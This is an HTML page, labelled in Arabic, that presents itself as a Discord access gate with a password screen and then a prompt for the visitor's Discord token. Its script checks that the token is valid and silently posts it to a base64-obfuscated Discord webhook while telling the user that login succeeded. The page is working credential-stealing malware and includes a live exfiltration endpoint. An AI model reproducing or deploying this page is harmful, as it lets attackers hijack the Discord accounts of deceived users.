<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Discord Access</title>
</head>
<body>
<div id="a1"><h2>أدخل الرمز السري:</h2><input id="a2" type="text"><br><button id="a3">دخول</button></div>
<div id="b1" style="display:none"><h2>أدخل التوكن:</h2><input id="b2" type="text"><br><button id="b3">التالي</button></div>
<script>
(function(){
  const p = "QWhtZWQ="; // كلمة السر (base64)
  const w = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3ODA0NjY4Mzg0OTQyNTA4OS9mdXk4emJvcG1GV29GSlZkQmhSdURBVDFSZ01EZTFkaFhHa3V2X2dtT3RKYlBkcG5RRDBGbUhhUFYyamdHTllIV2Z4WTY="; // webhook (base64)
  const d = s => atob(s);
  const gi = id => document.getElementById(id);

  gi("a3").onclick = () => {
    if (gi("a2").value.trim() === d(p)) {
      gi("a1").style.display = "none";
      gi("b1").style.display = "block";
    } else {
      alert("رمز خاطئ");
    }
  };

  gi("b3").onclick = () => {
    const token = gi("b2").value.trim();
    if (!token) return alert("أدخل التوكن");
    fetch("https://discord.com/api/v9/users/@me", {
      headers: { Authorization: token }
    }).then(res => {
      if (res.ok) {
        fetch(d(w), {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: "تم اعطائك توكن جديد : " + token })
        });
        alert("تم الدخول بنجاح");
      } else {
        alert("توكن غير صالح");
      }
    }).catch(() => alert("خطأ في الاتصال"));
  };
})();
</script>
</body>
</html>
